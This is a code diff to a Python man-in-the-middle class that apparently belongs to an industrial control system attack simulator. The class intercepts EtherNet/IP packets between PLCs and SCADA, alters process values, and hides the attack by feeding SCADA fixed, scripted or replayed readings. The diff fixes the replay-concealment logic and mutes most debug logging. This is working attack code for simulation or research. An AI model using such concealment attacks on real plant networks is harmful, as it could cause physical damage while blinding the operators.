@@ -40,8 +40,12 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
             elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
                 self.concealment_type = 'payload_replay'
                 self.captured_tags_pd = pd.DataFrame(columns=self.get_conceal_tags())
-                self.replay_duration = int(self.intermediate_attack['concealment_data']['capture_start']) + \
-                                       int(self.intermediate_attack['concealment_data']['capture_end'])
+                self.logger.debug('Tags to be replayed will be: ' + str(self.captured_tags_pd))
+                self.replay_duration = int(self.intermediate_attack['concealment_data']['capture_end']) - \
+                                       int(self.intermediate_attack['concealment_data']['capture_start'])
+
+                self.logger.debug('Capture and Replay duration is: ' + str(self.replay_duration))
+
             else:
                 raise ConcealmentError("Concealment data type is invalid, supported values are: "
                                        "'concealment_value', 'concealment_path', or 'payload_replay' ")
@@ -51,7 +55,7 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
     def get_conceal_tags(self):
         tag_list = []
         for tag in self.intermediate_attack['tags']:
-            tag_list.append(tag)
+            tag_list.append(tag['tag'])
         return tag_list
 
     def get_attack_tag(self, a_tag_name):
@@ -66,11 +70,11 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
             if session['tag'] == tag['tag']:
                 modified = True
                 if 'value' in tag.keys():
-                    self.logger.debug('attacking with value')
+                    #self.logger.debug('attacking with value')
                     return translate_float_to_payload(tag['value'], ip_payload[Raw].load)
 
                 elif 'offset' in tag.keys():
-                    self.logger.debug('attacking with offset')
+                    #self.logger.debug('attacking with offset')
                     return translate_float_to_payload(
                         translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                         ip_payload[Raw].load), modified
@@ -81,58 +85,66 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
                 if session['tag'] == tag['tag']:
                     modified = True
                     if 'value' in tag.keys():
-                        self.logger.debug('Concealment value is: ' + str(tag['value']))
+                        #self.logger.debug('Concealment value is: ' + str(tag['value']))
                         return translate_float_to_payload(tag['value'], ip_payload[Raw].load), modified
                     elif 'offset' in tag.keys():
-                        self.logger.debug('Concealment offset is: ' + str(tag['offset']))
+                        #self.logger.debug('Concealment offset is: ' + str(tag['offset']))
                         return translate_float_to_payload(
                             translate_payload_to_float(ip_payload[Raw].load) + tag['offset'],
                             ip_payload[Raw].load), modified
 
         elif self.intermediate_attack['concealment_data']['type'] == 'path':
-            self.logger.debug('Concealing to SCADA with path')
+            #self.logger.debug('Concealing to SCADA with path')
             exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
             concealment_value = float(self.concealment_data_pd.loc[exp][session['tag']].values[-1])
-            self.logger.debug('Concealing with value: ' + str(concealment_value))
+            #self.logger.debug('Concealing with value: ' + str(concealment_value))
             modified = True
             return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
 
         elif self.intermediate_attack['concealment_data']['type'] == 'payload_replay':
             self.logger.debug('Concealing with payload replay')
             current_clock = int(self.get_master_clock())
+            this_tag = str(session['tag'])
 
             # Capture phase of the payload replay attack
             if int(self.intermediate_attack['concealment_data']['capture_start']) <= current_clock < \
                     int(self.intermediate_attack['concealment_data']['capture_end']):
-                self.logger.debug('Capturing payload')
-                self.captured_tags_pd.loc[current_clock, session['tag']] = \
+                self.logger.debug('Capturing payload of tag ' + this_tag)
+                self.captured_tags_pd.loc[current_clock, this_tag] = \
                     translate_payload_to_float(ip_payload[Raw].load)
                 modified = False
+                self.logger.debug('Captured payload: \n' + str(self.captured_tags_pd.loc[current_clock]))
                 return ip_payload, modified
 
             if int(self.intermediate_attack['concealment_data']['replay_start']) <= current_clock < \
                     int(self.intermediate_attack['concealment_data']['replay_start']) + self.replay_duration:
-                self.logger.debug('Replyaing payload')
-                for tag in self.intermediate_attack['concealment_data']['concealment_value']:
+                self.logger.debug('Replaying payload')
+                for tag in self.intermediate_attack['tags']:
                     if session['tag'] == tag['tag']:
                         # Maybe we did not captured a value for that tag at that iteration
-                        if self.captured_tags_pd.loc[current_clock][tag['tag']]:
+                        if self.captured_tags_pd.loc[current_clock][this_tag]:
                             modified = True
-                            concealment_value = self.captured_tags_pd.loc[current_clock][tag['tag']]
+                            concealment_value = float(self.captured_tags_pd.loc[current_clock][tag['tag']])
+                            self.logger.debug('Replaying tag ' + str(tag['tag']) + ' with value '
+                                              + str(concealment_value))
                             return translate_float_to_payload(concealment_value, ip_payload[Raw].load), modified
+
+            # We could also let users finish the replay phase, but not finish the attack immediately
+            modified = False
+            return ip_payload, modified
 
     def handle_enip_response(self, ip_payload):
         this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
         this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
-        self.logger.debug('ENIP response session: ' + str(this_session))
-        self.logger.debug('ENIP response context: ' + str(this_context))
+        #self.logger.debug('ENIP response session: ' + str(this_session))
+        #self.logger.debug('ENIP response context: ' + str(this_context))
 
         # When target is SCADA, the concealment session will be stored in attack_session_ids
         if self.intermediate_attack['target'].lower() == 'scada':
             for session in self.attack_session_ids:
                 if session['session'] == this_session and session['context'] == this_context:
-                    self.logger.debug('Concealing to SCADA: ' + str(this_session))
+                    #self.logger.debug('Concealing to SCADA: ' + str(this_session))
                     return self.handle_concealment(session, ip_payload)
 
         # Attack values to PLCs
@@ -143,7 +155,7 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
         # Concealment values to SCADA
         for session in self.scada_session_ids:
             if session['session'] == this_session and session['context'] == this_context:
-                self.logger.debug('Concealing to SCADA: ' + str(this_session))
+                #self.logger.debug('Concealing to SCADA: ' + str(this_session))
                 return self.handle_concealment(session, ip_payload)
 
         modified = False
@@ -155,20 +167,20 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
         tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:offset]
         context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
-        self.logger.debug('this tag is: ' + str(tag_name))
+        #self.logger.debug('this tag is: ' + str(tag_name))
         this_tag = self.get_attack_tag(tag_name)
 
         if this_tag:
             # self.logger.debug('Tag name: ' + str(tag_name))
-            self.logger.debug('Attack tag: ' + str(this_tag['tag']))
+            #self.logger.debug('Attack tag: ' + str(this_tag['tag']))
             session_dict = {'session': this_session, 'tag': this_tag['tag'], 'context': context}
-            self.logger.debug('session dict: ' + str(session_dict))
+            #self.logger.debug('session dict: ' + str(session_dict))
 
             if ip_payload[IP].src == self.intermediate_yaml['scada']['public_ip']:
-                self.logger.debug('SCADA Req session')
+                #self.logger.debug('SCADA Req session')
                 self.scada_session_ids.append(session_dict)
             else:
-                self.logger.debug('PLC Req session')
+                #self.logger.debug('PLC Req session')
                 self.attack_session_ids.append(session_dict)
 
     def capture(self, packet):
@@ -195,13 +207,13 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
                 else:
                     if len(p) == 118:
-                        self.logger.debug('handling request 57')
+                        #self.logger.debug('handling request 57')
                         self.handle_enip_request(p, 57)
-                        self.logger.debug('handled request')
+                        #self.logger.debug('handled request')
                     elif len(p) == 116:
-                        self.logger.debug('handling request 56')
+                        #self.logger.debug('handling request 56')
                         self.handle_enip_request(p, 56)
-                        self.logger.debug('handled request')
+                        #self.logger.debug('handled request')
                     else:
                         packet.accept()
                         return
